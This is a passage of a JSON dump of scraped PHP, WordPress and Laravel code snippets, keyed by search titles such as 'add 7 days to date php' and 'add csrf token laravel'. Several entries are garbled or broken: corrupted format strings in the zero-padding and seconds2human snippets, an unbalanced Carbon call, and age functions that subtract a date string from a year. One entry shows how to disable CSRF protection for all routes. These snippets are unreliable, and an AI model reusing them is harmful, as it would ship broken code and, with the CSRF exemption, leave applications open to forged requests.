    "description": "<?php  // ACF REPEATER - BASIC LOOP  // check if the repeater field has rows of data if( have_rows('repeater_field_name') ):   \t// loop through the rows of data     while ( have_rows('repeater_field_name') ) : the_row();          // display a sub field value         the_sub_field('sub_field_name');      endwhile;  else :      // no rows found  endif;  ?>\n$count = count(get_field('repeater_name'));\n// ACF REPATER - ADVANCED LOOP  <?php if( have_rows('repeater_field_name') ): ?>  \t<ul class=\"slides\">  \t<?php while( have_rows('repeater_field_name') ): the_row();   \t\t// vars \t\t$image = get_sub_field('image'); \t\t$content = get_sub_field('content'); \t\t$link = get_sub_field('link');  \t\t?>  \t\t<li class=\"slide\">  \t\t\t<?php if( $link ): ?> \t\t\t\t<a href=\"<?php echo $link; ?>\"> \t\t\t<?php endif; ?>  \t\t\t\t<img src=\"<?php echo $image['url']; ?>\" alt=\"<?php echo $image['alt'] ?>\" />  \t\t\t<?php if( $link ): ?> \t\t\t\t</a> \t\t\t<?php endif; ?>  \t\t    <?php echo $content; ?>  \t\t</li>  \t<?php endwhile; ?>  \t</ul>  <?php endif; ?>\n",
    "reg_date": "2021-10-12T10:12:35.000Z"
  },
  {
    "id": 343,
    "keyword": null,
    "link": null,
    "title": " acf show the taxonomy image",
    "description": "<?php     $terms = get_the_terms( get_the_ID(), 'product_brands' );         if( ! empty( $terms ) ) : ?>            <ul>\t \t\t<?php foreach( $terms as $term ) : ?> \t\t\t\t\t\t    \t  \t\t <li class=\"<?php echo $term->slug; ?>\"> \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t                     <img src=\"<?php the_field('brand_logo', $term); ?>\" /> \t\t                    </li>    <?php endforeach; ?>           </ul>  <?php    endif; ?>\n",
    "reg_date": "2021-10-12T10:12:35.000Z"
  },
  {
    "id": 344,
    "keyword": null,
    "link": null,
    "title": " add 1 day php datetime",
    "description": "$date = new DateTime('2000-01-01'); $date->add(new DateInterval('P1D'));\n",
    "reg_date": "2021-10-12T10:12:35.000Z"
  },
  {
    "id": 345,
    "keyword": null,
    "link": null,
    "title": " add 6 months to date in php",
    "description": "<?php  // PHP program to add days to $Date     // Declare a date  $date = \"2019-05-10\";     // Add days to date and display it  echo date('Y-m-d', strtotime($date. ' + 10 days'));     ?> \n$effectiveDate = date('Y-m-d', strtotime(\"+3 months\", strtotime($effectiveDate)));\n",
    "reg_date": "2021-10-12T10:12:35.000Z"
  },
  {
    "id": 346,
    "keyword": null,
    "link": null,
    "title": " add 7 days to date php",
    "description": "$date = \"Mar 03, 2011\"; $date = strtotime($date); $date = strtotime(\"+7 day\", $date); echo date('M d, Y', $date);\n<?php   // adding extra days to date       // Steps: \t// 1) using carbon     // 2) using strtotime            //Step 1   $date = date('Y M d h:i:s') // 2020 09 22 22:09:26 UTC      $new_date = Carbon::parse($date->addDays(1); // adds extra day                                // Step 2   $date = date('Y M d h:i:s') // 2020 09 22 22:09:26 UTC      echo $new_date = date('Y M d h:i:s', strtotime($date. '+1 day')); ?>\n$start_date = \"2015/03/02\";   $date = strtotime($start_date); $date = strtotime(\"+7 day\", $date); echo date('Y/m/d', $date); \n$date = new DateTime('2020-11-24'); $date->add(new DateInterval(\"P9D\"));  echo $date->format('Y-m-d');\n",
    "reg_date": "2021-10-12T10:12:35.000Z"
  },
  {
    "id": 347,
    "keyword": null,
    "link": null,
    "title": " add a new column to existing table in a migration",
    "description": "php artisan make:migration add_paid_to_users_table --table=users    public function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }  public function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }  php artisan migrate\n// for Laravel 5+ php artisan make:migration add_email_to_users_table --table=users  public function up() {     Schema::table('users', function($table) {         $table->integer('email');     }); }  public function down() {     Schema::table('users', function($table) {         $table->dropColumn('email');     }); }  php artisan migrate\npublic function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }\npublic function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }\n",
    "reg_date": "2021-10-12T10:12:36.000Z"
  },
  {
    "id": 348,
    "keyword": null,
    "link": null,
    "title": " add a year php",
    "description": "$end = date('Y-m-d', strtotime('+5 years'));\n",
    "reg_date": "2021-10-12T10:12:36.000Z"
  },
  {
    "id": 349,
    "keyword": null,
    "link": null,
    "title": " add admin menu link custom wp",
    "description": " add_action( 'admin_menu', 'register_custom_menu_link' ); /**  * @author    Brad Dalton  * @example   http://wpsites.net/wordpress-admin/add-top-level-custom-admin-menu-link-in-dashboard-to-any-url/  * @copyright 2014 WP Sites  */ function register_custom_menu_link(){     add_menu_page(        'custom menu link',        'Your Menu Link',        'manage_options',        'any-url',        'wpsites_custom_menu_link',        'dashicons-external', 3     );  }  function wpsites_custom_menu_link(){     wp_redirect( 'http://www.example.com', 301 );  \texit; }\n",
    "reg_date": "2021-10-12T10:12:36.000Z"
  },
  {
    "id": 350,
    "keyword": null,
    "link": null,
    "title": " add another field in existing migration laravel",
    "description": "php artisan make:migration add_paid_to_users_table --table=users\nSchema::table('users', function($table) {     $table->string('phone_nr')->after('id'); }); \nSchema::table('users', function (Blueprint $table) { \t$table->dateTime('verify_date')->nullable()->after(\"password_updated_at\"); });\nphp artisan make:migration add_store_id_to_users_table --table=users \n",
    "reg_date": "2021-10-12T10:12:36.000Z"
  },
  {
    "id": 351,
    "keyword": null,
    "link": null,
    "title": " add array to array php",
    "description": "$myArr = [1, 2, 3, 4];  array_push($myArr, 5, 8); print_r($myArr); // [1, 2, 3, 4, 5, 8]  $myArr[] = -1; print_r($myArr); // [1, 2, 3, 4, 5, 8, -1]\narray_push($cart, 13); \n$fruits = [\"apple\", \"banana\"]; // array_push() function inserts one or more elements to the end of an array array_push($fruits, \"orange\");  // If you use array_push() to add one element to the array, it's better to use // $fruits[] = because in that way there is no overhead of calling a function. $fruits[] = \"orange\";  // output: Array ( [0] => apple [1] => banana [2] => orange )\n <?php $cesta = array(\"laranja\", \"morango\"); array_push($cesta, \"melancia\", \"batata\"); print_r($cesta); ?>  \n <?php $stack = array(\"orange\", \"banana\"); array_push($stack, \"apple\", \"raspberry\"); ?>  \n<?php $array1 = array(\"color\" => \"red\", 2, 4); $array2 = array(\"a\", \"b\", \"color\" => \"green\", \"shape\" => \"trapezoid\", 4); $result = array_merge($array1, $array2); /* Array (     [color] => green     [0] => 2     [1] => 4     [2] => a     [3] => b     [shape] => trapezoid     [4] => 4 ) */ ?>\n",
    "reg_date": "2021-10-12T10:12:36.000Z"
  },
  {
    "id": 352,
    "keyword": null,
    "link": null,
    "title": " add checkbox in server side datatable laravel",
    "description": "->editColumn('select_orders', static function ($row) {                 return '<input type=\"checkbox\" name=\"registrations[]\"                 value=\"'.$row->id.'\"/>';             })->rawColumns(['select_orders'])      Inside Config/datatables.php   'raw'       => ['action', 'checkbox'],   \n",
    "reg_date": "2021-10-12T10:12:36.000Z"
  },
  {
    "id": 353,
    "keyword": null,
    "link": null,
    "title": " add class to body class wordpress",
    "description": "add_filter( 'body_class', 'custom_class' ); function custom_class( $classes ) {     if ( is_page_template( 'page-example.php' ) ) {         $classes[] = 'example';     }     return $classes; } \n<body <?php body_class( 'class-name' ); ?>> \n<body <?php body_class(); ?>> \n",
    "reg_date": "2021-10-12T10:12:36.000Z"
  },
  {
    "id": 354,
    "keyword": null,
    "link": null,
    "title": " add column in laravel migration",
    "description": "php artisan make:migration add_paid_to_users_table --table=users    public function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }  public function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }  php artisan migrate\nphp artisan make:migration add_paid_to_users_table --table=users\npublic function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }\nphp artisan make:migration add_paid_to_users_table --table=users \nphp artisan make:migration create_users_table --create=users  php artisan make:migration add_votes_to_users_table --table=users\nclass AddProfileToUsers extends Migration {     /**      * Run the migrations.      *      * @return void      */     public function up()     {         Schema::table('users', function (Blueprint $table) {             $table->string('profile')->nullable();         });     }      /**      * Reverse the migrations.      *      * @return void      */     public function down()     {         Schema::table('shop_users', function (Blueprint $table) {             $table->dropColumn(['profile']);         });     } }\n",
    "reg_date": "2021-10-12T10:12:37.000Z"
  },
  {
    "id": 355,
    "keyword": null,
    "link": null,
    "title": " add column in laravel migration cmnd",
    "description": "php artisan make:migration add_paid_to_users_table --table=users    public function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }  public function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }  php artisan migrate\nphp artisan make:migration add_paid_to_users_table --table=users \nSchema::table('users', function (Blueprint $table) { \t$table->dateTime('verify_date')->nullable()->after(\"password_updated_at\"); });\nmigration add column to existing table in laravel 6 \n",
    "reg_date": "2021-10-12T10:12:37.000Z"
  },
  {
    "id": 356,
    "keyword": null,
    "link": null,
    "title": " add column to migration laravel",
    "description": "php artisan make:migration add_paid_to_users_table --table=users    public function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }  public function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }  php artisan migrate\nphp artisan make:migration add_paid_to_users_table --table=users\npublic function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }\nclass AddProfileToUsers extends Migration {     /**      * Run the migrations.      *      * @return void      */     public function up()     {         Schema::table('users', function (Blueprint $table) {             $table->string('profile')->nullable();         });     }      /**      * Reverse the migrations.      *      * @return void      */     public function down()     {         Schema::table('shop_users', function (Blueprint $table) {             $table->dropColumn(['profile']);         });     } }\nphp artisan make:migration add_profile_to_users\nSchema::table('table_name', function (Blueprint $table) {             $table->string('column_name', 255)->nullable()->after('previous_column_name');         });\n",
    "reg_date": "2021-10-12T10:12:37.000Z"
  },
  {
    "id": 357,
    "keyword": null,
    "link": null,
    "title": " add csrf token laravel",
    "description": "{{ csrf_token() }} {{ csrf_field() }}\n<meta name=\"csrf-token\" content=\"{{ csrf_token() }}\" />  <script type=\"text/javascript\"> $.ajaxSetup({     headers: {         'X-CSRF-TOKEN': $('meta[name=\"csrf-token\"]').attr('content')     } }); </script>\n//In laravel 7. Open file \\App\\Http\\Middleware\\VerifyCsrfToken.php //Disable for all routes  protected $except = [     '*', ]; //Disable for some routes  protected $except = [     'mobile/*',     'news/articles', ]; //I searched for a long time how to disable CSRF completely, //there are many identical examples but they do not help\npublic function refreshCSRFToken() {     session()->regenerate();     return response()->json(['token' => csrf_token()]); }  <script>     setInterval(function () {       $.ajax({         url: \"{{ route('updateCSRF') }}\",         type: 'get',         dataType: 'json',         success: function (result) {           $('meta[name=\"csrf-token\"]').attr('content', result.token);           $('input[name=\"_token\"]').val(result.token)             $.ajaxSetup({               headers: {                 'X-CSRF-TOKEN': result.token                 }             });         },         error: function (xhr, status, error) {           console.log(xhr);         }       });     }, 15 * (60 * 1000)) </script>\n<form method=\"POST\" action=\"/profile\">     @csrf     <input name=\"name\">   \t<button type=\"submit\">send</button> </form>\n",
    "reg_date": "2021-10-12T10:12:37.000Z"
  },
  {
    "id": 358,
    "keyword": null,
    "link": null,
    "title": " add customizer in wordpress",
    "description": "function your_php_code( $wp_customize ) {     $wp_customize->add_section( 'id_of_section', array(         'property1' => 'value1',         'property2' => 'value2',     ) );       $wp_customize->add_setting( 'name_of_option', array(         'property1' => 'value1',         'property2' => 'value2',     ) );       $wp_customize->add_control( 'name_of_option', array(         'section' => 'id_of_section',         'property2' => 'value2',     ) ); } add_action( 'customize_register', 'your_php_code' ); \n",
    "reg_date": "2021-10-12T10:12:37.000Z"
  },
  {
    "id": 359,
    "keyword": null,
    "link": null,
    "title": " add dd function composer",
    "description": "/* Install Run composer require larapack/dd 1.*  For Laravel Laravel already have the dd function in its helpers. The dd function from this package is equal to the one in Laravel 5.  If you wish to override the Laravel 4 function with this one, please follow those few steps:  Add require \"../vendor/larapack/dd/src/helper.php\"; after the opening <?php-tag */\n",
    "reg_date": "2021-10-12T10:12:37.000Z"
  },
  {
    "id": 360,
    "keyword": null,
    "link": null,
    "title": " add error to laravel validation",
    "description": "//setup Validator and passing request data and rules $validator = \\Validator::make(request()->all(), [     'due_date' => 'required',     'template' => 'required' ]);  //hook to add additional rules by calling the ->after method $validator->after(function ($validator) { \t     if (request('event') == null) {     \t//add custom error to the Validator         $validator->errors()->add('event', 'Please select an event');     }  });  //run validation which will redirect on failure $validator->validate();  //https://dcblog.dev/laravel-adding-custom-validation-errors\n$messages = $validator->errors()->getMessages(); var_dump($messages); \n",
    "reg_date": "2021-10-12T10:12:37.000Z"
  },
  {
    "id": 361,
    "keyword": null,
    "link": null,
    "title": " add hour minute in datetime in php",
    "description": "date('Y-m-d H:i',strtotime('+1 hour +20 minutes',strtotime($start)));\n$minutes_to_add = 5;  $time = new DateTime('2011-11-17 05:05'); $time->add(new DateInterval('PT' . $minutes_to_add . 'M'));  $stamp = $time->format('Y-m-d H:i');\n",
    "reg_date": "2021-10-12T10:12:37.000Z"
  },
  {
    "id": 362,
    "keyword": null,
    "link": null,
    "title": " add id to route name in laravel blade",
    "description": "route('something.edit', ['id' => $event->data->id])\n",
    "reg_date": "2021-10-12T10:12:37.000Z"
  },
  {
    "id": 363,
    "keyword": null,
    "link": null,
    "title": " add item to array in php",
    "description": "$myArr = [1, 2, 3, 4];  array_push($myArr, 5, 8); print_r($myArr); // [1, 2, 3, 4, 5, 8]  $myArr[] = -1; print_r($myArr); // [1, 2, 3, 4, 5, 8, -1]\narray_push($cart, 13); \n<?php  $a=array(\"red\",\"green\");  array_push($a,\"blue\",\"yellow\");  print_r($a); ?>\n$cart = array(); $cart[] = 13; $cart[] = 14; // etc  //Above is correct. but below one is for further understanding $cart = array(); for($i=0;$i<=5;$i++){     $cart[] = $i;   } echo \"<pre>\"; print_r($cart); echo \"</pre>\"; \n",
    "reg_date": "2021-10-12T10:12:37.000Z"
  },
  {
    "id": 364,
    "keyword": null,
    "link": null,
    "title": " add like and equal in same query in laravel",
    "description": "$data = DB::table('borrowers')         ->join('loans', 'borrowers.id', '=', 'loans.borrower_id')         ->select('borrowers.*', 'loans.*')            ->where('loan_officers', 'like', '%' . $officerId . '%')         ->where('loans.maturity_date', '<', date(\"Y-m-d\"))         ->get(); \n",
    "reg_date": "2021-10-12T10:12:38.000Z"
  },
  {
    "id": 365,
    "keyword": null,
    "link": null,
    "title": " add new column in existing migration",
    "description": "php artisan make:migration create_users_table --create=users  php artisan make:migration add_votes_to_users_table --table=users\n",
    "reg_date": "2021-10-12T10:12:38.000Z"
  },
  {
    "id": 366,
    "keyword": null,
    "link": null,
    "title": " add new column in existing table in laravel migration",
    "description": "php artisan make:migration add_paid_to_users_table --table=users    public function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }  public function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }  php artisan migrate\nphp artisan make:migration add_paid_to_users_table --table=users\npublic function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }\nSchema::table('users', function (Blueprint $table) { \t$table->dateTime('verify_date')->nullable()->after(\"password_updated_at\"); });\npublic function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }\n// The table method on the Schema facade MAY BE USED TO UPDATE EXISTING TABLES. // The table method accepts two arguments: the name of the table and a Closure // that receives a Blueprint instance you may use to add columns to the table: Schema::table('users', function (Blueprint $table) {     $table->string('email'); });\n",
    "reg_date": "2021-10-12T10:12:38.000Z"
  },
  {
    "id": 367,
    "keyword": null,
    "link": null,
    "title": " add new column in laravel migration",
    "description": "php artisan make:migration add_paid_to_users_table --table=users    public function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }  public function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }  php artisan migrate\nphp artisan make:migration add_paid_to_users_table --table=users\npublic function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }\nclass AddProfileToUsers extends Migration {     /**      * Run the migrations.      *      * @return void      */     public function up()     {         Schema::table('users', function (Blueprint $table) {             $table->string('profile')->nullable();         });     }      /**      * Reverse the migrations.      *      * @return void      */     public function down()     {         Schema::table('shop_users', function (Blueprint $table) {             $table->dropColumn(['profile']);         });     } }\nphp artisan make:migration add_profile_to_users\nSchema::table('table_name', function (Blueprint $table) {             $table->string('column_name', 255)->nullable()->after('previous_column_name');         });\n",
    "reg_date": "2021-10-12T10:12:38.000Z"
  },
  {
    "id": 368,
    "keyword": null,
    "link": null,
    "title": " add pagination to wordpress",
    "description": "<?php  // Full wp pagination example $paged = ( get_query_var( 'paged' ) ) ? get_query_var( 'paged' ) : 1;      $args = array(         'post_type' => 'blog',         'posts_per_page' => 10,         'paged' => $paged     );      // The Query     $the_query = new WP_Query( $args );      // The Loop     if ( $the_query->have_posts() ) {         while ( $the_query->have_posts() ) {           $the_query->the_post();           the_permalink();            the_title();            the_excerpt();         }     }      ?>      <div class=\"pagination\">         <?php             echo paginate_links( array(                 'base'         => str_replace( 999999999, '%#%', esc_url( get_pagenum_link( 999999999 ) ) ),                 'total'        => $the_query->max_num_pages,                 'current'      => max( 1, get_query_var( 'paged' ) ),                 'format'       => '?paged=%#%',                 'show_all'     => false,                 'type'         => 'plain',                 'end_size'     => 2,                 'mid_size'     => 1,                 'prev_next'    => true,                 'prev_text'    => sprintf( '<i></i> %1$s', __( 'Newer Posts', 'text-domain' ) ),                 'next_text'    => sprintf( '%1$s <i></i>', __( 'Older Posts', 'text-domain' ) ),                 'add_args'     => false,                 'add_fragment' => '',             ) );         ?>     </div>\n<?php      echo paginate_links( array(         'mid_size'  => 3,         'prev_text' => __( '&laquo; Prev', 'textdomain' ),         'next_text' => __( 'Next &raquo;', 'textdomain' ),       ) );  ?>\n",
    "reg_date": "2021-10-12T10:12:38.000Z"
  },
  {
    "id": 369,
    "keyword": null,
    "link": null,
    "title": " add post meta wordpress",
    "description": "<?php  $post_id = 1; $meta_key = '_test'; $meta_value = 'this is a test'; $unique = true;  add_post_meta( $post_id, $meta_key, $meta_value, $unique ); \n",
    "reg_date": "2021-10-12T10:12:38.000Z"
  },
  {
    "id": 370,
    "keyword": null,
    "link": null,
    "title": " add seconds to datetime carbon",
    "description": "Carbon::now()->addMinutes($minutes)->timestamp;\nTry to parse() it first: $date = Carbon::parse($dateTime)             ->addSeconds($seconds)             ->format('Y-m-d H:i:s');\n",
    "reg_date": "2021-10-12T10:12:38.000Z"
  },
  {
    "id": 371,
    "keyword": null,
    "link": null,
    "title": " add seconds to datetime php",
    "description": "date('Y-m-d H:i',strtotime('+1 hour +20 minutes',strtotime($start)));\nfunction seconds2human($ss) { $s = $ss`; $m = floor(($ss600)/60); $h = floor(($ss%86400)/3600); $d = floor(($ss%92000)/86400); $M = floor($ss/2592000);  return \"$M months, $d days, $h hours, $m minutes, $s seconds\"; }\n<?php  $date = new DateTime(); echo $date->getTimestamp(). \"<br>\"; $date->add(new DateInterval('PT674165S')); // adds 674165 secs echo $date->getTimestamp(); ?>\n",
    "reg_date": "2021-10-12T10:12:38.000Z"
  },
  {
    "id": 372,
    "keyword": null,
    "link": null,
    "title": " add shortcode in short description",
    "description": "<?php echo do_shortcode(\"[shortcode]\"); ?>\nremove_action( 'woocommerce_after_shop_loop_item', 'sp_loop_product_description', 6 ); add_action( 'woocommerce_after_shop_loop_item', 'wp_11326339_custom_description', 6 );  function wp_11326339_custom_description() {     global $product;      $wc_product = wc_get_product( $product );      if ( ! $wc_product ) {         return false;     }  $short_description = $wc_product->get_short_description();      if ( '' !== $short_description ) {         echo '<div itemprop=\"description\">' . do_shortcode( wpautop( wptexturize( $short_description ) ) ) . '</div>';     }     }\n",
    "reg_date": "2021-10-12T10:12:38.000Z"
  },
  {
    "id": 373,
    "keyword": null,
    "link": null,
    "title": " add sucssess message laravel",
    "description": "return redirect()->back()->with('message', 'IT WORKS!');  Displaying message if it exists:  @if(session()->has('message'))     <div class=\"alert alert-success\">         {{ session()->get('message') }}     </div> @endif\n",
    "reg_date": "2021-10-12T10:12:38.000Z"
  },
  {
    "id": 374,
    "keyword": null,
    "link": null,
    "title": " add to collection laravel",
    "description": "$item = collect(); $item->push($product);\n$name = DB::table('users')->where('name', 'John')->pluck('name');\n$collection = collect([1, 2, 3, 4]);  $collection->push(5);  $collection->all();  // [1, 2, 3, 4, 5]\n$collection = collect([1,2,3,4]);  $collection->each(function($item){     return $item*$item; });  // [1,4,9,16]\n",
    "reg_date": "2021-10-12T10:12:38.000Z"
  },
  {
    "id": 375,
    "keyword": null,
    "link": null,
    "title": " add two numbers in php",
    "description": "<?php   $x=15;   $y=30;   $z=$x+$y;   echo \"Sum: \",$z;   ?>  \n<?php   $x=10;   $y=20;   $z = $x + $y;   echo \"Sum of x and y : \". $z;   ?>\n",
    "reg_date": "2021-10-12T10:12:39.000Z"
  },
  {
    "id": 376,
    "keyword": null,
    "link": null,
    "title": " add user meta",
    "description": "<?php \tadd_user_meta($user_id, $meta_key, $meta_value, $unique); ?>\n",
    "reg_date": "2021-10-12T10:12:39.000Z"
  },
  {
    "id": 377,
    "keyword": null,
    "link": null,
    "title": " add values to array dynamically php",
    "description": "There are quite a few ways to work with dynamic arrays in PHP. Initialise an array:  $array = array(); Add to an array:  $array[] = \"item\"; // for your $arr1  $array[$key] = \"item\"; // for your $arr2 array_push($array, \"item\", \"another item\"); Remove from an array:  $item = array_pop($array); $item = array_shift($array); unset($array[$key]); There are plenty more ways, these are just some examples.\n",
    "reg_date": "2021-10-12T10:12:39.000Z"
  },
  {
    "id": 378,
    "keyword": null,
    "link": null,
    "title": " add zeros in front of number php",
    "description": "<?php $num = 4; $num_padded = sprintf(\"\u0002d\", $num); echo $num_padded; // returns 04 ?>\n",
    "reg_date": "2021-10-12T10:12:39.000Z"
  },
  {
    "id": 379,
    "keyword": null,
    "link": null,
    "title": " adding a line to html php",
    "description": "echo  \"kings \\n garden\";\n",
    "reg_date": "2021-10-12T10:12:39.000Z"
  },
  {
    "id": 380,
    "keyword": null,
    "link": null,
    "title": " adding css to php file",
    "description": "echo \"<link rel='stylesheet' type='text/css' href='CSS/main.css'>\";\n",
    "reg_date": "2021-10-12T10:12:39.000Z"
  },
  {
    "id": 381,
    "keyword": null,
    "link": null,
    "title": " addition in php",
    "description": "<?php   $x=15;   $y=30;   $z=$x+$y;   echo \"Sum: \",$z;   ?>  \n",
    "reg_date": "2021-10-12T10:12:39.000Z"
  },
  {
    "id": 382,
    "keyword": null,
    "link": null,
    "title": " addslashes php",
    "description": "The real_escape_string() / mysqli_real_escape_string() function escapes special characters in a string for use in an SQL query, taking into account the current character set of the connection.  Object oriented style: $mysqli -> real_escape_string(escapestring)   $mysqli = new mysqli(\"localhost\",\"my_user\",\"my_password\",\"my_db\");  // Escape special characters, if any $firstname = $mysqli -> real_escape_string($_POST['firstname']); $lastname = $mysqli -> real_escape_string($_POST['lastname']); $age = $mysqli -> real_escape_string($_POST['age']);  Procedural style: mysqli_real_escape_string(connection, escapestring)    $con = mysqli_connect(\"localhost\",\"my_user\",\"my_password\",\"my_db\");  // Escape special characters, if any $firstname = mysqli_real_escape_string($con, $_POST['firstname']); $lastname = mysqli_real_escape_string($con, $_POST['lastname']); $age = mysqli_real_escape_string($con, $_POST['age']);\n$str = addslashes('What does \"yolo\" mean?'); echo($str); $str = addcslashes('What does \"yolo\" mean?','?'); echo($str);\n$str = addslashes('What does \"yolo\" mean?'); echo($str);\n$str = addslashes('What does \"yolo\" mean?'); // for either ' or \" echo($str); $str = addcslashes('What does \"yolo\" mean?','?'); // specify charaters to preceed by \\ echo($str);\n/* The addslashes() function returns a string with backslashes in front of predefined characters.  The predefined characters are:  single quote (') double quote (\") backslash (\\) NULL  Tip: This function can be used to prepare a string for storage in a database and database queries. */  // Example usage: $str = addslashes('What does \"yolo\" mean?'); echo($str);  // Expected Output: What does \\\"yolo\\\" mean?\n",
    "reg_date": "2021-10-12T10:12:39.000Z"
  },
  {
    "id": 383,
    "keyword": null,
    "link": null,
    "title": " adeleye ayodeji",
    "description": "<?php   echo \"From Adeleye Ayodeji | Web Developer\";  $more = 'Adeleye Ayodeji is a professional with a broad set of skills in software,  web development, speaking among many other God-given talents.  Equipped with so many skills and great personality.';  echo $more;  echo \"www.adeleyeayodeji.com\";  ?>\n",
    "reg_date": "2021-10-12T10:12:39.000Z"
  },
  {
    "id": 384,
    "keyword": null,
    "link": null,
    "title": " admin bar hide",
    "description": "/* Disable WordPress Admin Bar for all users */ add_filter( 'show_admin_bar', '__return_false' ); \n",
    "reg_date": "2021-10-12T10:12:39.000Z"
  },
  {
    "id": 385,
    "keyword": null,
    "link": null,
    "title": " admin enqueue scripts specific page",
    "description": "add_action('admin_menu', function () {   $settingsPage = add_options_page('Settings', 'Mortgage Calculator', 'manage_options', 'mortgagecalculator', function () {     echo \"<div id='app'></div>\";   });   /**    * Include the ember admin scripts only on pages where it's needed.    */   add_action(\"admin_enqueue_scripts\", function ($hook) use ($settingsPage){     if($hook !== $settingsPage){       return;     }     // Remove default jQuery since Ember provides its own.     wp_dequeue_script('jquery');     wp_enqueue_script('ember-vendor', plugins_url(\"admin/assets/vendor.js\", __FILE__));     wp_enqueue_script('ember-project', plugins_url(\"admin/assets/mortgage-plugin-ember-admin.js\", __FILE__), ['ember-vendor']);     wp_enqueue_script('ember-live-reload', \"http://localhost:4200/ember-cli-live-reload.js\");   }); }); \nfunction my_enqueue($hook) { if ( 'bookings' != $hook ) {     return; } if ( is_admin() ) { wp_enqueue_style('datatablecss','//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css' ); wp_enqueue_style('datatablecss2','//cdn.datatables.net/1.10.16/css/dataTables.bootstrap.min.css' ); wp_enqueue_script('datatablejs','//cdn.datatables.net/1.10.16/js/jquery.dataTables.min.js',array(),'1.0',false); wp_enqueue_script('datatablejs2','//cdn.datatables.net/1.10.16/js/dataTables.bootstrap.min.js',array(),'1.0',false);} add_action( 'wp_enqueue_scripts', 'my_enqueue' ); } \n",
    "reg_date": "2021-10-12T10:12:40.000Z"
  },
  {
    "id": 386,
    "keyword": null,
    "link": null,
    "title": " adminlte 3 laravel",
    "description": "composer require jeroennoten/laravel-adminlte\nRoute::get('admin', function () {     return view('admin_template'); });\n",
    "reg_date": "2021-10-12T10:12:40.000Z"
  },
  {
    "id": 387,
    "keyword": null,
    "link": null,
    "title": " adminlte in laravel 8",
    "description": "composer require jeroennoten/laravel-adminlte\n/*  * Acacha AdminLTE template provider  */ Acacha\\AdminLTETemplateLaravel\\Providers\\AdminLTETemplateServiceProvider::class, \n/*  * Acacha AdminLTE template alias  */ 'AdminLTE' => Acacha\\AdminLTETemplateLaravel\\Facades\\AdminLTE::class, \n",
    "reg_date": "2021-10-12T10:12:40.000Z"
  },
  {
    "id": 388,
    "keyword": null,
    "link": null,
    "title": " advanced custom field repeater",
    "description": "<?php  // check if the repeater field has rows of data if( have_rows('repeater_field_name') ):   \t// loop through the rows of data     while ( have_rows('repeater_field_name') ) : the_row();          // display a sub field value         the_sub_field('sub_field_name');      endwhile;  else :      // no rows found  endif;  ?>\n<?php  $rows = get_field('repeater_field_name'); if( $rows ) {     echo '<ul class=\"slides\">';     foreach( $rows as $row ) {         $image = $row['image'];         echo '<li>';             echo wp_get_attachment_image( $image, 'full' );             echo wpautop( $row['caption'] );         echo '</li>';     }     echo '</ul>'; }\n<?php   $rows = get_field('repeater_field_name'); if($rows) { \techo '<ul>';  \tforeach($rows as $row) \t{ \t\techo '<li>sub_field_1 = ' . $row['sub_field_1'] . ', sub_field_2 = ' . $row['sub_field_2'] .', etc</li>'; \t}  \techo '</ul>'; }\n",
    "reg_date": "2021-10-12T10:12:40.000Z"
  },
  {
    "id": 389,
    "keyword": null,
    "link": null,
    "title": " advanced custom forms php",
    "description": "$value = get_field( \"text_field\" );  if( $value ) {     echo $value; } else {     echo 'empty'; }\n<img src=\"<?php the_field('image_test'); ?>\" alt=\"\" />\n",
    "reg_date": "2021-10-12T10:12:40.000Z"
  },
  {
    "id": 390,
    "keyword": null,
    "link": null,
    "title": " aes php",
    "description": "function encrypt($plaintext, $password) {     $method = \"AES-256-CBC\";     $key = hash('sha256', $password, true);     $iv = openssl_random_pseudo_bytes(16);      $ciphertext = openssl_encrypt($plaintext, $method, $key, OPENSSL_RAW_DATA, $iv);     $hash = hash_hmac('sha256', $ciphertext . $iv, $key, true);      return $iv . $hash . $ciphertext; }  function decrypt($ivHashCiphertext, $password) {     $method = \"AES-256-CBC\";     $iv = substr($ivHashCiphertext, 0, 16);     $hash = substr($ivHashCiphertext, 16, 32);     $ciphertext = substr($ivHashCiphertext, 48);     $key = hash('sha256', $password, true);      if (!hash_equals(hash_hmac('sha256', $ciphertext . $iv, $key, true), $hash)) return null;      return openssl_decrypt($ciphertext, $method, $key, OPENSSL_RAW_DATA, $iv); }  //Example usage: $encrypted = encrypt('Plaintext string.', 'password'); // this yields a binary string  echo decrypt($encrypted, 'password'); // decrypt($encrypted, 'wrong password') === null\n",
    "reg_date": "2021-10-12T10:12:40.000Z"
  },
  {
    "id": 391,
    "keyword": null,
    "link": null,
    "title": " age date de naissance php",
    "description": "function age($date) {           $age = date('Y') - $date;          if (date('md') < date('md', strtotime($date))) {              return $age - 1;          }          return $age;      } \n",
    "reg_date": "2021-10-12T10:12:40.000Z"
  },
  {
    "id": 392,
    "keyword": null,
    "link": null,
    "title": " age php datetime",
    "description": "function get_age( $date ) {      $age = date('Y') - $date;     if (date('md') < date('md', strtotime($date))) {         return $age - 1;     }     return $age;  } \n",
    "reg_date": "2021-10-12T10:12:40.000Z"
  },
  {
    "id": 393,
    "keyword": null,
    "link": null,
    "title": " ajax call too functions.php",
